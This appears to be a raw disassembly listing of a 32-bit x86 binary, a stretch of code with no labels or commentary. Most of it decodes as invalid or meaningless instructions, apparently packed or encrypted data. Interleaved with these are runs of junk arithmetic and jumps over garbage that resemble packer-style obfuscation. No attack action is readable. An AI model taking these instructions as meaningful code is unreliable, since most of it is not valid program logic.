  41f552:	inc    edx
  41f553:	in     al,dx
  41f554:	jle    0x41f52b
  41f556:	loop   0x41f512
  41f558:	ret    0x23c9
  41f55b:	cmp    esi,ebx
  41f55d:	xor    DWORD PTR [edi-0x4d0b2867],ebp
  41f563:	gs dec edi
  41f565:	bound  eax,QWORD PTR [edi]
  41f567:	xor    BYTE PTR [ebx+eiz*4-0x16edca7a],ch
  41f56e:	iret   
  41f56f:	rcr    eax,1
  41f571:	data16 fisub DWORD PTR [edx+0x4b]
  41f575:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f576:	rol    DWORD PTR [esp+esi*1],cl
  41f579:	add    al,0x64
  41f57b:	sahf   
  41f57c:	mov    ch,0x71
  41f57e:	mov    bl,0xfb
  41f580:	jecxz  0x41f5e5
  41f582:	ins    BYTE PTR es:[edi],dx
  41f583:	xor    ebx,ecx
  41f585:	xchg   ebp,eax
  41f586:	jmp    DWORD PTR [ebx]
  41f588:	pop    esp
  41f589:	inc    esi
  41f58a:	fisttp QWORD PTR [ebx-0x204fa4d2]
  41f590:	sbb    al,0x5a
  41f592:	jns    0x41f5b2
  41f594:	mov    ecx,DWORD PTR [ebp-0xdc]
  41f59a:	and    eax,ecx
  41f59c:	add    eax,DWORD PTR [ebp-0x44]
  41f59f:	mov    ecx,DWORD PTR [ebp-0xe0]
  41f5a5:	lea    eax,[eax+ecx*1+0x272f]
  41f5ac:	xor    eax,0x1080c
  41f5b1:	add    eax,DWORD PTR [ebp-0x178]
  41f5b7:	mov    DWORD PTR [ebp-0xe8],eax
  41f5bd:	mov    DWORD PTR [ebp-0xc],0x5950
  41f5c4:	mov    DWORD PTR [ebp-0xf8],0x4964
  41f5ce:	mov    DWORD PTR [ebp-0x130],0x3
  41f5d8:	mov    DWORD PTR [ebp-0x20],0x2df9
  41f5df:	mov    DWORD PTR [ebp-0x8],0x4524
  41f5e6:	mov    DWORD PTR [ebp-0xd4],0x637e
  41f5f0:	mov    DWORD PTR [ebp-0x110],0x38c8
  41f5fa:	mov    DWORD PTR [ebp-0xa4],0x7118
  41f604:	mov    DWORD PTR [ebp-0xa0],0xaf6
  41f60e:	mov    DWORD PTR [ebp-0x10c],0x3315
  41f618:	mov    eax,DWORD PTR [ebp-0xf8]
  41f61e:	mov    ecx,DWORD PTR [ebp-0x130]
  41f624:	xor    edx,edx
  41f626:	div    ecx
  41f628:	add    eax,0x454e
  41f62d:	mov    ecx,DWORD PTR [ebp-0xc]
  41f630:	and    eax,ecx
  41f632:	xor    eax,0x5940
  41f637:	add    eax,DWORD PTR [ebp+0x8]
  41f63a:	mov    ecx,DWORD PTR [ebp-0x110]
  41f640:	mov    edx,DWORD PTR [ebp-0xa4]
  41f646:	sub    ecx,edx
  41f648:	mov    edx,DWORD PTR [ebp-0xd4]
  41f64e:	or     ecx,edx
  41f650:	mov    edx,DWORD PTR [ebp-0x8]
  41f653:	and    ecx,edx
  41f655:	jmp    0x41fa3c
  41f65a:	cmp    DWORD PTR [ebx-0x6397a419],esi
  41f660:	mov    edx,0x50f9fab3
  41f665:	sahf   
  41f666:	dec    ebx
  41f667:	clc    
  41f668:	mov    edi,0xc0854ccf
  41f66d:	mov    esi,0xbebec44a
  41f672:	push   ds
  41f673:	xchg   edx,eax
  41f674:	mov    esi,0xf9513cc3
  41f679:	leave  
  41f67a:	jl     0x41f6e6
  41f67c:	cmp    BYTE PTR [ebp+0x23],al
  41f67f:	mov    edx,0x774e4e28
  41f684:	mov    esi,0xf08eb13
  41f689:	ins    BYTE PTR es:[edi],dx
  41f68a:	push   cs
  41f68b:	push   ebx
  41f68c:	xlat   BYTE PTR ds:[ebx]
  41f68d:	pop    ebp
  41f68e:	inc    esi
  41f68f:	in     al,0x3f
  41f691:	mov    esi,0xed432fc5
  41f696:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f697:	and    al,0xb8
  41f699:	xchg   DWORD PTR [ebx],eax
  41f69b:	inc    ecx
  41f69c:	sub    esp,DWORD PTR [ebx-0x674f6dac]
  41f6a2:	sbb    ebp,DWORD PTR [edi]
  41f6a4:	ret    0x5a2b
  41f6a7:	and    eax,edi
  41f6a9:	mov    ds:0x4294f161,al
  41f6ae:	push   DWORD PTR [ebx-0x68432a51]
  41f6b4:	sub    al,0xd7
  41f6b6:	inc    ebp
  41f6b7:	inc    edx
  41f6b8:	retf   
  41f6b9:	push   cs
  41f6ba:	mov    ecx,0x2689d0e9
  41f6bf:	sti    
  41f6c0:	imul   DWORD PTR [edi+0x78965311]
  41f6c6:	adc    BYTE PTR [eax],dh
  41f6c8:	inc    esi
  41f6c9:	and    eax,eax
  41f6cb:	outs   dx,BYTE PTR ds:[esi]
  41f6cc:	lods   al,BYTE PTR ds:[esi]
  41f6cd:	xchg   edi,eax
  41f6ce:	add    edi,DWORD PTR [edx]
  41f6d0:	fsubr  QWORD PTR [ebp-0x4f7e3c4e]
  41f6d6:	mov    al,ds:0xc17673cd
  41f6db:	shl    DWORD PTR [esi*1-0xdabfbef],0x28
  41f6e3:	scas   al,BYTE PTR es:[edi]
  41f6e4:	rcr    BYTE PTR [esi],cl
  41f6e6:	popa   
  41f6e7:	sar    DWORD PTR [edx+0x50],cl
  41f6ea:	push   ecx
  41f6eb:	dec    edx
  41f6ec:	or     edx,DWORD PTR ds:0x8d2475e
  41f6f2:	mov    ebp,0x82fca997
  41f6f7:	sahf   
  41f6f8:	in     eax,dx
  41f6f9:	sbb    al,0x4
  41f6fb:	data16 loope 0x41f70c
  41f6fe:	fdiv   DWORD PTR ds:0x7bf917ed
  41f704:	(bad)  
  41f705:	or     al,0xf5
  41f707:	arpl   WORD PTR [eax+0x16e57a91],bp
  41f70d:	cmp    al,0x71
  41f70f:	or     DWORD PTR [edi+eax*2-0x32607d40],esi
  41f716:	ins    DWORD PTR es:[edi],dx
  41f717:	pop    ebx
  41f718:	arpl   WORD PTR [ecx-0x22],di
  41f71b:	jmp    DWORD PTR [edx+ecx*2-0x37de3bcc]
  41f722:	mov    bl,0x8d
  41f724:	sub    eax,0x607d28d6
  41f729:	push   cs
  41f72a:	test   al,0x34
  41f72c:	jae    0x41f764
  41f72e:	ins    DWORD PTR es:[edi],dx
  41f72f:	lds    esp,FWORD PTR [edx]
  41f731:	mov    ebp,0xe690b140
  41f736:	push   edi
  41f737:	mov    edx,0xcd7b388c
  41f73c:	pop    ebp
  41f73d:	mov    cl,0xc3
  41f73f:	enter  0x6246,0x2a
  41f743:	repnz pop ebx
  41f745:	and    bl,ch
  41f747:	mov    WORD PTR [ecx],?
  41f749:	xchg   ebp,eax
  41f74a:	into   
  41f74b:	xor    al,0x8f
  41f74d:	sub    DWORD PTR [edi-0x5e3c250b],edx
  41f753:	push   eax
  41f754:	and    BYTE PTR [esi+0x14],ah
  41f757:	stos   DWORD PTR es:[edi],eax
  41f758:	mov    bl,bh
  41f75a:	retf   
  41f75b:	pop    es
  41f75c:	sar    DWORD PTR [esi-0x24d5c8ee],cl
  41f762:	ret    
  41f763:	addr16 cli 
  41f765:	jl     0x41f7db
  41f767:	jg     0x41f7a7
  41f769:	xchg   ebx,eax
  41f76a:	mov    DWORD PTR [ecx],esp
  41f76c:	test   BYTE PTR cs:[esi],bl
  41f76f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f770:	push   ebp
  41f771:	data16 sbb ah,bl
  41f774:	call   0xe4b:0xb588a6f8
  41f77b:	aas    
  41f77c:	inc    edi
  41f77d:	stos   BYTE PTR es:[edi],al
  41f77e:	xchg   ebx,eax
  41f77f:	test   al,0x4f
  41f781:	pop    es
  41f782:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f784:	or     eax,0xe8399883
  41f789:	add    eax,0xbeccee64
  41f78e:	sbb    eax,0x85d9b179
  41f793:	push   ss
  41f794:	rol    DWORD PTR [ecx+ebx*2+0x36],0xd2
  41f799:	ins    BYTE PTR es:[edi],dx
  41f79a:	inc    edx
  41f79b:	daa    
  41f79c:	(bad)  
  41f79d:	outs   dx,BYTE PTR ds:[esi]
  41f79e:	mul    DWORD PTR [esp+edx*1]
  41f7a1:	shl    BYTE PTR [ebp+0x28],0x40
  41f7a5:	jle    0x41f75f
  41f7a7:	xchg   esi,eax
  41f7a8:	outs   dx,DWORD PTR ds:[esi]
  41f7a9:	addr16 enter 0x23b6,0xe1
  41f7ae:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41f7b0:	mov    WORD PTR ds:0xb7170096,?
  41f7b6:	xchg   ecx,eax
  41f7b7:	inc    edi
  41f7b8:	add    al,BYTE PTR [esi]
  41f7ba:	xchg   esp,eax
  41f7bb:	inc    eax
  41f7bc:	ss jge 0x41f7a8
  41f7bf:	in     eax,dx
  41f7c0:	xchg   ebp,eax
  41f7c1:	jg     0x41f822
  41f7c3:	jp     0x41f7e0
  41f7c5:	mov    ds:0x503aefb4,eax
  41f7ca:	fst    DWORD PTR [ebx]
  41f7cc:	out    0x24,eax
  41f7ce:	scas   eax,DWORD PTR es:[edi]
  41f7cf:	shl    BYTE PTR [eax],1
  41f7d1:	dec    DWORD PTR [ebx]
  41f7d3:	mov    eax,0xf840679a
  41f7d8:	(bad)  
  41f7d9:	inc    DWORD PTR [ebx-0x3507a5b4]
  41f7df:	(bad)  
  41f7e1:	sub    eax,0x21c2754f
  41f7e6:	xor    edx,DWORD PTR [edi+0x2b]
  41f7e9:	xchg   esp,eax
  41f7ea:	int3   
  41f7eb:	scas   eax,DWORD PTR es:[edi]
  41f7ec:	out    dx,al
  41f7ed:	or     al,0x60
  41f7ef:	cmp    ecx,ebx
  41f7f1:	pushf  
  41f7f2:	pop    eax
  41f7f3:	cmp    al,BYTE PTR [ecx+0x3f]
  41f7f6:	adc    dl,BYTE PTR [ebx]
  41f7f8:	push   cs
  41f7f9:	ss (bad) 
  41f7fb:	mov    BYTE PTR [ecx-0x755f22a9],dh
  41f801:	clc    
  41f802:	mov    ds:0xec2923af,al
  41f807:	jmp    0x6ca0:0xd527a90c
  41f80e:	je     0x41f82d
  41f810:	(bad)  
  41f811:	cmp    cl,BYTE PTR [esi+0x23]
  41f814:	add    al,0x98
  41f816:	and    BYTE PTR [eax],0x3e
  41f819:	call   0x85b6ac1b
  41f81e:	into   
  41f81f:	ins    BYTE PTR es:[edi],dx
  41f820:	mov    esi,esp
  41f822:	bound  esi,QWORD PTR [eax+0x7d]
  41f825:	and    DWORD PTR ds:0x5cd3b095,esp
  41f82b:	xchg   esi,eax
  41f82c:	loope  0x41f7dc
  41f82e:	gs dec eax
  41f830:	(bad)  
  41f831:	clc    
  41f832:	dec    edi
  41f833:	xchg   BYTE PTR [ebp+0x7f687def],ch
  41f839:	jo     0x41f8a7
  41f83b:	mov    ebp,0x5f45b355
  41f840:	shl    DWORD PTR [edx+0x3a],1
  41f843:	jmp    0x41f88a
  41f845:	outs   dx,BYTE PTR ds:[esi]
  41f846:	loopne 0x41f84f
  41f848:	daa    
  41f849:	sbb    al,0x19
  41f84b:	jl     0x41f858
  41f84d:	push   ds
  41f84e:	xor    cl,cl
  41f850:	jns    0x41f7da
  41f852:	jmp    0xf6ae5860
  41f857:	arpl   WORD PTR [ebp+0x36],sp
  41f85a:	mov    ah,0x52
  41f85c:	gs push ebp
  41f85e:	cli    
  41f85f:	add    esp,DWORD PTR [eax]
  41f861:	sub    dl,BYTE PTR [ebp+eax*8+0x8]
  41f865:	jl     0x41f7f5
  41f867:	repz jmp 0x503c6edf
  41f86d:	xchg   esi,eax
  41f86e:	xor    DWORD PTR [ebx+edi*2],ecx
  41f871:	mov    ds:0xf402454,al
  41f876:	mov    cl,0xcb
  41f878:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f879:	test   DWORD PTR [edi+0x7],0xcf3bc2bf
  41f880:	loop   0x41f86f
  41f882:	push   ds
  41f883:	call   0xcbe2:0x88e4bdc8
  41f88a:	(bad)  
  41f88b:	fild   DWORD PTR [eax+0x6fd1985]
  41f891:	jle    0x41f8e4
  41f893:	adc    eax,0xfd7427f6
  41f898:	push   eax
  41f899:	in     eax,0xb9
  41f89b:	add    esp,DWORD PTR [edi]
  41f89d:	push   0xac1bd89f
  41f8a2:	in     al,dx
  41f8a3:	pop    ds
  41f8a4:	lds    edi,FWORD PTR [esi]
  41f8a6:	mov    dl,0x56
  41f8a8:	push   cs
  41f8a9:	cs pushf 
  41f8ab:	push   edx
  41f8ac:	xchg   BYTE PTR [ebp+0x786d7307],bh
  41f8b2:	iret   
  41f8b3:	and    DWORD PTR ds:0xd10ea4d5,ecx
  41f8b9:	and    edx,DWORD PTR [esi-0x32634477]
  41f8bf:	cmp    al,0xeb
  41f8c1:	lods   eax,DWORD PTR ds:[esi]
  41f8c2:	mov    dh,0x14
  41f8c4:	(bad)  
  41f8c5:	in     al,0x17
  41f8c7:	in     al,dx
  41f8c8:	xor    ah,al
  41f8ca:	xor    DWORD PTR [edx-0x5466b984],ebx
  41f8d0:	fs loope 0x41f86c
  41f8d3:	test   DWORD PTR [edx-0x599c52fa],ebp
  41f8d9:	jne    0x41f874
  41f8db:	out    dx,al
  41f8dc:	aaa    
  41f8dd:	lods   eax,DWORD PTR ds:[esi]
  41f8de:	jmp    0x76580059
  41f8e3:	loop   0x41f8b0
  41f8e5:	cmp    eax,0xfa677657
  41f8ea:	adc    eax,0xe7b23e61
  41f8ef:	jmp    0xc99b:0xd5aa6336
  41f8f6:	lods   al,BYTE PTR ds:[esi]
  41f8f7:	cmp    al,0xdc
  41f8f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8fa:	shl    edx,1
  41f8fc:	sub    esp,DWORD PTR [edi]
  41f8fe:	add    DWORD PTR [edx],ebx
  41f900:	out    dx,eax
  41f901:	into   
  41f902:	stos   BYTE PTR es:[edi],al
  41f903:	pop    edi
  41f904:	lock mov ds:0xfce1353c,eax
  41f90a:	dec    eax
  41f90b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f90c:	js     0x41f98d
  41f90e:	xchg   ecx,eax
  41f90f:	iret   
  41f910:	sub    eax,ecx
  41f912:	fcomip st,st(2)
  41f914:	test   BYTE PTR [esi+0x68bb95be],bh
  41f91a:	sbb    DWORD PTR [esp+esi*8-0x70],ecx
  41f91e:	(bad)  
  41f91f:	pop    edx
  41f920:	mov    ebx,0x43b277f5
  41f925:	stos   BYTE PTR es:[edi],al
  41f926:	(bad)  
  41f927:	jnp    0x41f8ca
  41f929:	add    al,0x2a
  41f92b:	adc    DWORD PTR [ecx-0x32640577],edi
  41f931:	cmp    DWORD PTR [ecx],esp
  41f933:	adc    edi,DWORD PTR [edx+ebx*8+0x723bac0c]
  41f93a:	dec    ebx
  41f93b:	fwait
  41f93c:	or     al,0xa8
  41f93e:	jl     0x41f915
  41f940:	lds    esp,FWORD PTR [ebx]
  41f942:	cmp    DWORD PTR [esi],ecx
  41f944:	or     al,0xd0
  41f946:	xchg   edi,eax
  41f947:	adc    DWORD PTR [edi+0x15],esi
  41f94a:	add    al,0x7e
  41f94c:	mov    ebp,0xc79b5079
  41f951:	sub    BYTE PTR [edx+ebp*4],0x12
  41f955:	sbb    BYTE PTR [edx+eiz*8-0x10a6cf12],ah
  41f95c:	cmp    dl,al
  41f95e:	add    BYTE PTR [ecx-0x2c975286],0x39
  41f965:	aaa    
  41f966:	cmp    DWORD PTR gs:[edi+eiz*2+0x5b4fb7e6],ebp
  41f96e:	sti    
  41f96f:	das    
  41f970:	out    dx,al
  41f971:	pop    esp
  41f972:	push   esi
  41f973:	test   eax,0x2960920
  41f978:	push   edx
  41f979:	cmc    
  41f97a:	lods   eax,DWORD PTR ds:[esi]
  41f97b:	loop   0x41f97a
  41f97d:	add    eax,0x5e9fa119
  41f982:	add    esi,ebx
  41f984:	xchg   ebx,eax
  41f985:	and    DWORD PTR [ecx+0x4631085],0x79677bce
  41f98f:	rcr    BYTE PTR [eax+0x7f],cl
  41f992:	mov    esp,0x11951aa4
  41f997:	pop    esp
  41f998:	cmp    cl,BYTE PTR [edx+0x65]
  41f99b:	fild   WORD PTR [eax]
  41f99d:	cdq    
  41f99e:	inc    ebx
  41f99f:	mov    bh,0x86
  41f9a1:	jne    0x41fa1b
  41f9a3:	aam    0x60
  41f9a5:	out    dx,eax
  41f9a6:	ja     0x41f980
  41f9a8:	xchg   edx,eax
  41f9a9:	or     BYTE PTR [edx],al
  41f9ab:	aad    0xaf
  41f9ad:	sbb    eax,0xa0c75b85
  41f9b2:	add    ebp,edi
  41f9b4:	scas   al,BYTE PTR es:[edi]
  41f9b5:	jmp    0x10e7:0xaf0ce19d
  41f9bc:	shr    DWORD PTR [eax],1
  41f9be:	mov    ebp,0x2da6d6dd
  41f9c3:	fcom   DWORD PTR [edi+0x7c9d836a]
  41f9c9:	mov    edx,0xea47703e
  41f9ce:	enter  0x8e5e,0x4b
  41f9d2:	ins    BYTE PTR es:[edi],dx
  41f9d3:	push   0xa76e6601
  41f9d8:	ret    
  41f9d9:	inc    ebx
  41f9da:	dec    esp
  41f9db:	std    
  41f9dc:	(bad)  
  41f9de:	imul   DWORD PTR [ecx-0x654ad776]
  41f9e4:	push   0x32
  41f9e6:	dec    edx
  41f9e7:	dec    esi
  41f9e8:	sbb    eax,DWORD PTR [ecx]
  41f9ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9eb:	xor    DWORD PTR [ecx-0x32259327],esp
  41f9f1:	jne    0x41f99f
  41f9f3:	je     0x41f99a
  41f9f5:	nop
  41f9f6:	leave  
  41f9f7:	jle    0x41f9dc
  41f9f9:	push   esp
  41f9fa:	lods   eax,DWORD PTR ds:[esi]
  41f9fb:	adc    DWORD PTR [edx-0x36820552],ecx
  41fa01:	inc    esp
  41fa02:	and    eax,0x8578b35
  41fa07:	stc    
  41fa08:	sub    edx,DWORD PTR [ebp-0x2eba7295]
  41fa0e:	(bad)  
  41fa0f:	fmul   QWORD PTR [ecx-0x56a00a6c]
  41fa15:	lods   eax,DWORD PTR ds:[esi]
  41fa16:	int    0x3
  41fa18:	sub    DWORD PTR ds:0x770af6f2,esi
  41fa1e:	sbb    ecx,DWORD PTR [esi+0x46a7b085]
  41fa24:	pop    ecx
  41fa25:	lds    esi,FWORD PTR [eax+ebp*2-0x19]
  41fa29:	rcr    cl,cl
  41fa2b:	mov    BYTE PTR [edi-0x31],al
  41fa2e:	add    DWORD PTR [edi+0x3cfb9c26],0x5a
  41fa35:	xchg   ebp,eax
  41fa36:	cli    
  41fa37:	cmp    ecx,DWORD PTR [esi]
  41fa39:	jnp    0x41fa84
  41fa3b:	test   BYTE PTR [ebx-0x35cc1fab],cl
  41fa41:	mov    edx,DWORD PTR [ebp-0x10c]
  41fa47:	mov    esi,0x180f
  41fa4c:	sub    esi,edx
  41fa4e:	mov    edx,DWORD PTR [ebp-0xa0]
  41fa54:	imul   esi,edx
  41fa57:	xor    esi,0x402b
  41fa5d:	xor    esi,0xfed78c17
  41fa63:	mov    edx,DWORD PTR [ebp-0xe8]
  41fa69:	mov    ecx,DWORD PTR [edx+ecx*1-0x68bd]
  41fa70:	add    ecx,eax
  41fa72:	add    esi,ecx
  41fa74:	mov    DWORD PTR [ebp-0x38],esi
  41fa77:	mov    DWORD PTR [ebp-0x4],0x59a8
  41fa7e:	mov    DWORD PTR [ebp-0x30],0x7021
  41fa85:	mov    DWORD PTR [ebp-0xf4],0x6210
  41fa8f:	mov    DWORD PTR [ebp-0x58],0x73d5
  41fa96:	mov    DWORD PTR [ebp-0x124],0x1e7d
  41faa0:	mov    DWORD PTR [ebp-0x3c],0x3144
  41faa7:	mov    eax,DWORD PTR [ebp-0x30]
  41faaa:	xor    eax,0x75cb
  41faaf:	mov    ecx,DWORD PTR [ebp-0x4]
  41fab2:	imul   eax,ecx
  41fab5:	mov    ecx,DWORD PTR [ebp+0x8]
  41fab8:	lea    ecx,[ecx+eax*1-0x2123b90]
  41fabf:	mov    eax,DWORD PTR [ebp-0xf4]
  41fac5:	and    eax,0x6b34
  41faca:	and    eax,0x658d
  41facf:	xor    edx,edx
  41fad1:	push   0x6
  41fad3:	pop    esi
  41fad4:	div    esi
  41fad6:	imul   eax,eax,0x3fb9
  41fadc:	mov    edx,DWORD PTR [ebp-0x3c]
  41fadf:	and    edx,0x58c7
  41fae5:	mov    esi,DWORD PTR [ebp-0x124]
  41faeb:	or     edx,esi
  41faed:	add    edx,0x7a25
  41faf3:	imul   edx,edx,0x28d2
  41faf9:	mov    esi,DWORD PTR [ebp-0x58]
  41fafc:	xor    edx,esi
  41fafe:	xor    edx,0x1856f731
  41fb04:	mov    esi,DWORD PTR [ebp-0xe8]
  41fb0a:	mov    eax,DWORD PTR [esi+eax*1-0x3fb8fdc]
  41fb11:	add    eax,ecx
  41fb13:	add    edx,eax
  41fb15:	mov    DWORD PTR [ebp-0xac],edx
  41fb1b:	mov    DWORD PTR [ebp-0x54],0x1
  41fb22:	mov    DWORD PTR [ebp-0x40],0x1ee8
  41fb29:	mov    DWORD PTR [ebp-0x1c],0x64d8
  41fb30:	mov    DWORD PTR [ebp-0xf0],0x5a06
  41fb3a:	mov    DWORD PTR [ebp-0x108],0x2eeb
  41fb44:	mov    DWORD PTR [ebp-0x104],0x2108
  41fb4e:	mov    eax,DWORD PTR [ebp-0x1c]
  41fb51:	jmp    0x41ff38
  41fb56:	cwde   
  41fb57:	push   ebx
  41fb58:	popa   
  41fb59:	pop    edx
  41fb5a:	stos   BYTE PTR es:[edi],al
  41fb5b:	jl     0x41fb15
  41fb5d:	xchg   ebx,eax
  41fb5e:	mov    dl,0x3a
  41fb60:	repnz iret 
  41fb62:	popa   
  41fb63:	or     edx,DWORD PTR [edx-0x3f722870]
  41fb69:	mov    esi,0xbebec44a
  41fb6e:	mov    dl,al
  41fb70:	sbb    al,dl
  41fb72:	mov    esp,0xbb064632
  41fb77:	xchg   ebp,eax
  41fb78:	add    eax,0x12986624
  41fb7d:	xlat   BYTE PTR ds:[ebx]
  41fb7e:	jmp    0x11cbac89
  41fb83:	add    dl,cl
  41fb85:	and    al,0x86
  41fb87:	jmp    0x44c:0x29fee1c4
  41fb8e:	sbb    bh,BYTE PTR [edi+0x2db93061]
  41fb94:	stos   BYTE PTR es:[edi],al
  41fb95:	dec    edx
  41fb96:	mov    ds:0x2cbe7fe8,al
  41fb9b:	imul   esp,DWORD PTR ds:0xc99c733c,0x6
  41fba2:	(bad)  
  41fba3:	rol    BYTE PTR [edi],1
  41fba5:	fadd   QWORD PTR [edi]
  41fba7:	jae    0x41fb54
  41fba9:	into   
  41fbaa:	push   ss
  41fbab:	mov    dl,0xc7
  41fbad:	mov    esi,0x82c6cb0b
  41fbb2:	stos   DWORD PTR es:[edi],eax
  41fbb3:	imul   esp,ecx,0xfeeda211
  41fbb9:	jmp    0xa4e2aa5e
  41fbbe:	add    DWORD PTR [ebx-0x34],esp
  41fbc1:	xor    ch,BYTE PTR [esi]
  41fbc3:	and    BYTE PTR [ecx+0x1816dbcc],0x95
  41fbca:	imul   edx,DWORD PTR ds:0x59de7208,0xc8ab0995
  41fbd4:	jge    0x41fbf3
  41fbd6:	in     al,0xa5
  41fbd8:	leave  
  41fbd9:	mov    ah,0x43
  41fbdb:	in     eax,0x1e
  41fbdd:	in     eax,dx
  41fbde:	in     eax,dx
  41fbdf:	inc    edx
  41fbe0:	cmp    edi,DWORD PTR [edi]
  41fbe2:	xchg   edx,eax
  41fbe3:	dec    ebp
  41fbe4:	stos   WORD PTR es:[edi],ax
  41fbe6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbe7:	outs   dx,BYTE PTR ds:[esi]
  41fbe8:	fadd   DWORD PTR [ebx+0x5f978fb6]
  41fbee:	cmp    BYTE PTR [edi-0x4f],0x3f
  41fbf2:	adc    eax,0x1aba6f70
  41fbf7:	enter  0x8813,0xb4
  41fbfb:	jecxz  0x41fc71
  41fbfd:	fs inc esp
  41fbff:	xchg   ebx,eax
  41fc00:	icebp  
  41fc01:	jb     0x41fba2
  41fc03:	inc    edx
  41fc04:	mov    dh,0xf7
  41fc06:	xor    bh,bl
  41fc08:	add    DWORD PTR [edi],esi
  41fc0a:	bound  edi,QWORD PTR [edi+0x674e0a2f]
  41fc10:	inc    esp
  41fc11:	jno    0x41fc1a
  41fc13:	jmp    0xa476904a
  41fc18:	dec    esp
  41fc19:	cmp    esp,DWORD PTR [ebx-0x4bcfe8b]
  41fc1f:	adc    al,0xfd
  41fc21:	imul   ebx,DWORD PTR [eax+0x57],0x3c
  41fc25:	xchg   BYTE PTR [eax],ch
  41fc27:	jl     0x41fc0e
  41fc29:	cld    
  41fc2a:	popf   
  41fc2b:	bound  ecx,QWORD PTR [ecx]
  41fc2d:	sbb    al,0x6d
  41fc2f:	out    0x1c,eax
  41fc31:	fld    DWORD PTR [ebx]
  41fc33:	pop    edx
  41fc34:	(bad)  [ebp+0x40146752]
  41fc3a:	mov    cl,0x5d
  41fc3c:	xor    eax,0x109af68
  41fc41:	ins    BYTE PTR es:[edi],dx
  41fc42:	mov    ds:0x98fa4956,al
  41fc47:	ficomp WORD PTR [eax-0x48]
  41fc4a:	xor    DWORD PTR [edi],edx
  41fc4c:	test   al,0xc5
  41fc4e:	das    
  41fc4f:	scas   eax,DWORD PTR es:[edi]
  41fc50:	pop    eax
  41fc51:	adc    al,0x8b
  41fc53:	mul    DWORD PTR [esi]
  41fc55:	pop    ss
  41fc56:	ret    0xbfa8
  41fc59:	jp     0x41fcbb
  41fc5b:	enter  0xd8b9,0x99
  41fc5f:	xchg   ebx,eax
  41fc60:	cmp    al,0xca
  41fc62:	sub    esp,ebx
  41fc64:	std    
  41fc65:	add    al,0x20
  41fc67:	xchg   BYTE PTR [ecx+edi*8],bl
  41fc6a:	add    eax,0x5db4b592
  41fc6f:	(bad)  
  41fc70:	jmp    0xa899b815
  41fc75:	pop    edi
  41fc76:	mov    cl,0xec
  41fc78:	add    BYTE PTR [ebp+0x7b678441],al
  41fc7e:	push   ds
  41fc7f:	mov    bl,0x16
  41fc81:	idiv   DWORD PTR [ebx+0x60]
  41fc84:	pop    esp
  41fc85:	in     al,dx
  41fc86:	daa    
  41fc87:	push   cs
  41fc88:	sbb    al,0xcd
  41fc8a:	aaa    
  41fc8b:	ins    BYTE PTR es:[edi],dx
  41fc8c:	dec    esp
  41fc8d:	stc    
  41fc8e:	scas   eax,DWORD PTR es:[edi]
  41fc8f:	push   esp
  41fc90:	outs   dx,DWORD PTR ds:[esi]
  41fc91:	xchg   BYTE PTR [esi+ebp*4+0x66],bh
  41fc95:	lahf   
  41fc96:	in     al,0x19
  41fc98:	inc    bx
  41fc9a:	pop    edi
  41fc9b:	(bad)  
  41fc9c:	rol    BYTE PTR [edx+0x30],cl
  41fc9f:	xchg   bh,dh
  41fca1:	push   eax
  41fca2:	xor    eax,0x52967b3d
  41fca7:	fidiv  WORD PTR [eax-0x167c601]
  41fcad:	ins    DWORD PTR es:[edi],dx
  41fcae:	push   edi
  41fcaf:	or     DWORD PTR [edx],0xfffffff2
  41fcb2:	int3   
  41fcb3:	rep outs dx,BYTE PTR ds:[esi]
  41fcb5:	push   es
  41fcb6:	push   ebp
  41fcb7:	ret    0x4e7
  41fcba:	add    eax,0x946ed242
  41fcbf:	xor    eax,0x9a3ac2cb
  41fcc4:	jp     0x41fcc4
  41fcc6:	push   ds
  41fcc7:	push   ecx
  41fcc8:	jge    0x41fc56
  41fcca:	sti    
  41fccb:	pushf  
  41fccc:	mov    ?,WORD PTR [eax+0x3f]
  41fccf:	mov    dh,0x19
  41fcd1:	xor    al,0xf9
  41fcd3:	cmp    esi,esp
  41fcd5:	ds mov edi,0xdd4c2889
  41fcdb:	push   cs
  41fcdc:	enter  0x75a0,0xca
  41fce0:	loopne 0x41fca9
  41fce2:	sub    al,0xf
  41fce4:	push   cs
  41fce5:	xchg   ecx,eax
  41fce6:	test   eax,0x936c43bc
  41fceb:	ror    DWORD PTR [ebp+0x5d],0x39
  41fcef:	(bad)  
  41fcf0:	fisttp DWORD PTR [esi+0x61]
  41fcf3:	int3   
  41fcf4:	pushf  
  41fcf5:	add    BYTE PTR [edi-0x25085cc6],bl
  41fcfb:	inc    ebp
  41fcfc:	div    DWORD PTR [eax+0x25]
  41fcff:	adc    al,0xef
  41fd01:	fist   WORD PTR [edx-0x349a93e1]
  41fd07:	push   cs
  41fd08:	test   al,0xc8
  41fd0a:	push   0xfb75250b
  41fd0f:	data16 (bad) 
  41fd11:	push   esi
  41fd12:	inc    ebx
  41fd13:	jecxz  0x41fce7
  41fd15:	mov    esp,0x4d57eb3f
  41fd1a:	enter  0xcb81,0x4f
  41fd1e:	cwde   
  41fd1f:	jno    0x41fd73
  41fd21:	data16 mov dh,BYTE PTR [esi-0x694e5503]
  41fd28:	xchg   edi,eax
  41fd29:	cmp    al,0x4f
  41fd2b:	fsubr  QWORD PTR [edx+0x7e666da3]
  41fd31:	jno    0x41fd81
  41fd33:	test   al,0x60
  41fd35:	(bad)  
  41fd36:	icebp  
  41fd37:	fsubrp st(5),st
  41fd39:	test   al,0x82
  41fd3b:	inc    esi
  41fd3c:	dec    ebp
  41fd3d:	jecxz  0x41fcf8
  41fd3f:	call   0xa3ddd63c
  41fd44:	fst    DWORD PTR [ecx-0x6d]
  41fd47:	sar    DWORD PTR [edi+eiz*4+0xf9bebd1],1
  41fd4e:	in     eax,dx
  41fd4f:	fimul  DWORD PTR [ecx-0x61]
  41fd52:	inc    esi
  41fd53:	xchg   esi,ebx
  41fd55:	dec    edx
  41fd56:	in     al,dx
  41fd57:	xor    DWORD PTR [ebp+0x35d49f81],0xffffffbd
  41fd5e:	jb     0x41fcff
  41fd60:	popa   
  41fd61:	std    
